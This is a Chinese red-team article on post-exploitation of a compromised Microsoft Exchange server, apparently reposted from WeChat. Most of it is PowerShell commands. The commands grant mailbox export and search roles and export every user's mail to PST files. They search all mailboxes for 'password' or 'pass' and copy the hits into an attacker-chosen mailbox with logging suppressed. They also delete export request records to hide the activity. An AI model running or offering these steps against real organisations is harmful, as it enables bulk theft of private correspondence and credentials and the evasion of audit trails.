> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6pH_I_VrTUwuOywuOurUKw)

Exchange 邮箱服务器后利用

  

**目录**

  

  

使用 PSSession 连接 Exchange 服务器管理邮件  
    导出邮件  
        导出所有用户的所有邮件  
        导出指定用户的所有邮件  
        筛选导出邮件  
        导出请求记录  
    使用 powershell 脚本导出邮件  
        导出指定用户的所有邮件  
        导出所有用户的所有邮件  
    搜索邮件  
        搜索邮件的常用命令  
        使用 powershell 脚本搜索  
    在 Exchange 服务器上直接管理邮件  
    导出邮件  
        导出所有用户的所有邮件  
        导出指定用户的所有邮件  
        使用 powershell 脚本导出邮件  
    搜索邮件  
        搜索邮件的常用命令  
        使用 powershell 脚本搜索

  

作者：谢公子 @深蓝攻防实验室

当我们拿到了 Exchange 邮箱服务器权限后，我们可以进行进一步的利用。比如导出所有用户或指定用户的邮件、搜索特定用户或所有用户的敏感邮件等等。

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

使用 PSSession 连接 Exchange 服务器管理邮件

首先使用 PSSession 连接 Exchange 服务器

  

  

#使用 PSSession 连接 Exchange 服务器

$User = "xie\administrator"

$Pass = ConvertTo-SecureString -AsPlainText P@ssword1234 -Force

$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass

$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://mail.xie.com/PowerShell/ -Authentication Kerberos -Credential $Credential

Import-PSSession $Session -AllowClobber

#查看所有用户邮箱地址

Get-Mailbox

#查看 PSSession

Get-PSSession

#断开 PSSession

Remove-PSSession $Session

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFu8rMcBKLK9ByPj9mhp2E6uDHicxpDKibic7IBO4TJaU19GVF9KmWJBWSKQ/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

导出邮件

在使用 PSSession 连接 Exchange 服务器后，执行以下操作导出邮件  
    1. 将用户添加到角色组”Mailbox Import Export”  
    2. 重新启动 Powershell 否则无法使用命令 `New-MailboxexportRequest`  
    3. 导出邮件，导出的文件格式后缀为 .pst，可以用 outlook 打开  
将用户从角色组”Mailbox Import Export” 添加、移除

  

  

#将用户 hack 添加到 Mailbox Import Export 组

New-ManagementRoleAssignment –Role "Mailbox Import Export" –User administrator

#查看 Mailbox Import Export 组内的用户

Get-ManagementRoleAssignment –Role "Mailbox Import Export"|fl user

#将用户 hack 从 Mailbox Import Export 组移除

Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-administrator

" -Confirm:$false

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuk90MiaV0Q7vcK9jM9vBzCsAAVmtLricW93iczVmWc7Na3qvczX2IIag4A/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

导出所有用户的所有邮件

导出所有用户的所有邮件到 C:\users\public\ 目录下

  

  

Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath ("\\localhost\c$\users\public\"+($_.name)+".pst") -CompletedRequestAgeLimit 0 }

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuF03AY5eFgRic0srGkm41QfM8eib94qXbpxVmNicrk7ZfbJvex7Jvicrksg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

导出指定用户的所有邮件

导出指定 administrator 用户的所有邮件到 C:\users\public\ 目录下

$Username = "administrator"  

New-MailboxexportRequest -mailbox $Username -FilePath ("\\localhost\c$\users\public\"+$Username+".pst") -CompletedRequestAgeLimit 0

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuFPoibhYoxx6xCs953wVuWOkV64VibCic4c1k8BWibXJxZjHad3tFbuFBibQ/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

筛选导出邮件

筛选出指定用户的 administrator 中包含 pass 的邮件，保存到 Exchange 服务器的 c:\users\public \ 目录下

  

  

$User = "administrator"

New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like "* 密码 *")} -FilePath ("\\localhost\c$\users\public\"+$User+".pst") -CompletedRequestAgeLimit 0

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFu6TSKXZ18BMS1nmUu6ZbYTWp3AY2TEtvpYuYYeRj8icJZgXhFy6R3iaTA/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

导出请求记录

导出后会自动保存导出请求的记录，默认为 30 天，如果不想保存导出请求，可以加上参数

  

  

-CompletedRequestAgeLimit 0

其他关于导出请求记录命令

  

  

#查看邮件导出请求

Get-MailboxExportRequest

#删除所有导出请求

Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false

#删除某个导出请求

Remove-MailboxExportRequest -Identity 'xie.com/Users/hack\MailboxExport' -Confirm:$false

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuE2ktwgia5XW3TYr1OBpbugywjMNic4ia1vKkiaWjM3SPBfC38Hbicib3MEfg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

使用 powershell 脚本导出邮件

该 powershell 脚本作者：[3gstudent] https://3gstudent.github.io

地址为：https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToExportMailfromExchange.ps1

  
该脚本流程如下：  
1. 使用 PSSession 连接到 Exchange 服务器  
2. 判断使用的用户是否被加入到角色组”Mailbox Import Export” 如果未被添加，需要添加用户  
3. 导出邮件并保存至 Exchange 服务器的 c:\users\public ，格式为 pst 文件  
4. 如果新添加了用户，那么会将用户移除角色组”Mailbox Import Export”  
5. 清除 PSSession  
对脚本进行了简单的修改，使用命令如下：

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

导出指定用户的所有邮件

  

  

  

  

import-module .\UsePSSessionToExportMailfromExchange.ps1

UsePSSessionToExportMailfromExchange -User "administrator" -Password "P@ssword1234" -MailBox "administrator" -ExportPath "\\localhost\c$\users\public\" -ConnectionUri "http://mail.xie.com/PowerShell/"

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFusicm19oibStsqwElNdbC4rXHKoytUCsEy6HjLSB89k9F2QrdibhnPRqgw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

导出所有用户的所有邮件

  

  

  

  

Import-Module .\UsePSSessionToExportAllUserMailfromExchange.ps1

UsePSSessionToExportMailfromExchange -User "administrator" -Password "P@ssword1234" -ExportPath "\\localhost\c$\users\public\" -ConnectionUri "http://mail.xie.com/PowerShell/"

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFu8AD4Hu3rwVz9icWbwA4Lw6GmNibibiaibIvNnoYY77icDExaocsZP7RKsALQ/640)

目前该功能已经集成到插件中

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuN7dKxCv78aJ5ZjcXDSicKYC78wqeScoQx53BCaa4cFQBg37qhcr9A3g/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuFDib7xS3tWwRFMgaKGIxDiaRZfMRe5q5tsWs4EKtcQGx8P4I4pJjKzVA/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

搜索邮件

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

搜索邮件的常用命令

  

  

基本流程同导出邮件类似，但是区别在于角色组 `"Mailbox Import Export"` 需要更换成 `"Mailbox Search"`

  

  

#使用 PSSession 连接 Exchange 服务器  
$User = "xie\administrator"  
$Pass = ConvertTo-SecureString -AsPlainText P@ssword1234 -Force  
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass  
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://mail.xie.com/PowerShell/ -Authentication Kerberos -Credential $Credential  
Import-PSSession $Session -AllowClobber  
#将用户添加到角色组”Mailbox Search”  
New-ManagementRoleAssignment –Role "Mailbox Search" –User administrator  
#搜索所有包含单词 pass 的邮件并保存到用户 test2 的 outAll 文件夹  
Get-Mailbox|Search-Mailbox -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "outAll" -LogLevel Suppress| Out-Null  
#搜索指定用户 administrator 中包含单词 pass 的邮件并保存到用户 test 的 out 文件夹  
Search-Mailbox -Identity "administrator" -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "out" -LogLevel Suppress| Out-Null

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFukT4cL6AlL4Cia4PYYdoVfrxSY5BCG9tRSqqeaxpTfZIupN9NjmbKPuw/640)

登录 test 用户邮箱，即可看到 out 和 outAll 收件箱。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuXaZUZiarbicKic7cf1ERuxsGYC6sVgbovhCGS75xx8WicBjLQGn6Rmtiadw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

使用 powershell 脚本搜索

  

  

该 powershell 脚本作者：[3gstudent] https://3gstudent.github.io

地址为：https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToSearchMailfromExchange.ps1  
搜索所有用户的邮件中包含单词 pass 的邮件并保存到用户 test 的 outAll 文件夹：

  

  

UsePSSessionToSearchMailfromExchange -User "administrator" -Password "P@ssword1234" -MailBox "All" -ConnectionUri "http://mail.xie.com/PowerShell/" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "outAll"

搜索指定用户 administrator 中包含单词 pass 的邮件并保存到用户 test 的 out 文件夹：

  

  

UsePSSessionToSearchMailfromExchange -User "administrator" -Password "P@ssword1234" -MailBox "administrator" -ConnectionUri "http://mail.xie.com/PowerShell/" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "out"

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuUaE85lDAFx8vot2sjSHqZKQ02MIomiacDVDxEhpUxBVBUwc6IY2dknA/640)

目前该功能已经集成到插件中

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFu6iaNXAlleaUSzpFSG8vcJE89xcy1flI5GgJ5Q2HDx12exqF3e7nruOA/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuQPgISRn0Fy5rqjQYOjVmTLywNRwRODDKJ3Q9dV7I0uibxqd4vv483ug/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

在 Exchange 服务器上直接管理邮件

添加管理单元，不同 Exchange 版本对应的管理单元名称不同：

  

  

#Exchange 2007

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;

#Exchange 2010

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;

#Exchange 2013 & 2016: 

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;

#获取所有用户邮箱 (默认显示 1000 个)

Get-Mailbox

#获取所有用户邮箱 (加上 - ResultSize 参数，则显示所有)

Get-Mailbox -ResultSize unlimited

#只显示所有用户邮箱 Name 自段

Get-Mailbox|fl Name 

#获得所有邮箱的信息，包括邮件数和上次访问邮箱的时间

Get-Mailbox | Get-MailboxStatistics

#获得所有 OU

Get-OrganizationalUnit

#查询指定用户指定时间起发送邮件的记录

Get-MessageTrackingLog -EventID send -Start "01/11/2019 09:00:00" -Sender "test@xie.com"

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFue5JxkLWKjicSV35TRKib1iajvic7zspSiaEiaKF5GRGaW8A4BSJ7cE4eyQJA/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuOGjL4y6ibk8XtFf4vD7l5n1s9GH2B67LCJbRxsGSnsj2e08UibZV7eYg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

导出邮件

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

导出所有用户的所有邮件

  

  

导出所有用户的邮件，保存到 Exchange 服务器的 c:\users\public\ 目录：

  

  

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;

Get-Mailbox | %{New-MailboxexportRequest -mailbox $_.name -FilePath ("\\localhost\c$\users\public\"+($_.name)+".pst")}

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFucXmen5r4rxmTHCArUSSE6xiaibLyVDLIXMx1G3eaicFcUpZ0uogDC8pvQ/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

导出指定用户的所有邮件

  

  

导出指定用户 administrator 的邮件，保存到 Exchange 服务器的 c:\users\public\ 目录：

  

  

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;

$User = "administrator"

New-MailboxexportRequest -mailbox $User -FilePath ("\\localhost\c$\users\public\"+$User+".pst")

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuFyTzudy5LctNcING2pB26Jz5VkIvUdElj5Tl2xoNiauq3hd9XPGo6FA/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

使用 powershell 脚本导出邮件

该 powershell 脚本作者：[3gstudent] https://3gstudent.github.io

地址为：https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1

使用时需要指定 Exchange 版本

  

  

Import-module DirectExportMailfromExchange.ps1

DirectExportMailfromExchange -MailBox "administrator" -ExportPath "\\localhost\c$\users\public\" -Filter "{`"(body -like `"*pass*`")`"}" -Version 2016

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuT9XOFgjNuJukthvVGQlT6jyVzarMNnLibrvKwylf7S85kUXcrw3Isdg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BMwTpo3AhHkjqoy8hAdMRhibaSqrdZj8s0PMHBZAH9LHLfxhSmQOUUow/640?wx_fmt=png)

搜索邮件

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

搜索邮件的常用命令

  

  

  

  

#枚举所有邮箱用户，显示包含关键词 pass 的邮件的数量

Get-Mailbox|Search-Mailbox -SearchQuery `"*pass*`" -EstimateResultOnly

#搜索邮箱用户 test，显示包含关键词 pass 的邮件的数量

Search-Mailbox -Identity test -SearchQuery `"*pass*`" -EstimateResultOnly

#枚举所有邮箱用户，导出包含关键词 pass 的邮件至用户 test 的文件夹 out 中 (不保存日志)

Get-Mailbox|Search-Mailbox -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "outall" -LogLevel Suppress

#搜索邮箱用户 test，导出包含关键词 pass 的邮件至用户 test 的文件夹 out 中 (不保存日志)

Search-Mailbox -Identity administrator -SearchQuery `"*pass*`" -TargetMailbox "test" -TargetFolder "out" -LogLevel Suppress

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuGXCPWXGCM1TYymKoEsfs3kkxJWc24MZcB3pgyLlRodJs75HAZZMnpg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuJibuFVvqZV9ndngAibL6A67YDyBPonVaVgYUa6dnUtD9M0OibxvUXPELg/640)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiayA3GECqVoib2sEloM0Sl1BicibbVSH7kGt4gMlian3fpa1t2ReMyIwDIqLzGxwvu8ymzeRibQEjYquoQ/640?wx_fmt=png)

使用 powershell 脚本搜索

  

  

该 powershell 脚本作者：[3gstudent] https://3gstudent.github.io

地址为：https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1

搜索指定用户 administrator 中包含单词 pass 的邮件并保存到用户 test 的 out 文件夹：

  

  

DirectSearchMailfromExchange -MailBox "administrator" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "out2" -Version 2016

搜索所有包含单词 pass 的邮件并保存到用户 test 的 outAll 文件夹：

  

  

DirectSearchMailfromExchange -MailBox "All" -Filter `"*pass*`" -TargetMailbox "test" -TargetFolder "outAll" -Version 2016

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuMPuO879AKB2ptCo1icSicWlVibnAAjf3Ppe1TD9aB6zfTeYVecngBXtog/640)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOQ4y2LPbOicOictFxvXzHFuGC7gRnAf6pvK26NktkKoHmIoGWTA1ZiaRibGp1cGy72BHVvicSrCzS9Qg/640)

   ▼

如果想跟我一起讨论的话，那就加入我的知识星球吧！

▼

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2eKvY8jwoT7yxMvHfscqNQUJ2ed5fxYvws9QrsiaaXtMqRxaiaWFryhXYVpiaDxVUPA2vBQvj0G0uKicQ/640?wx_fmt=png)

参考：https://3gstudent.github.io/ 渗透基础 - 从 Exchange 服务器上搜索和导出邮件 

  

END

  

  

如果想跟我一起讨论，那快加入我的知识星球吧！https://t.zsxq.com/7MnIAM7

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2eKvY8jwoT7yxMvHfscqNQUJ2ed5fxYvws9QrsiaaXtMqRxaiaWFryhXYVpiaDxVUPA2vBQvj0G0uKicQ/640?wx_fmt=png)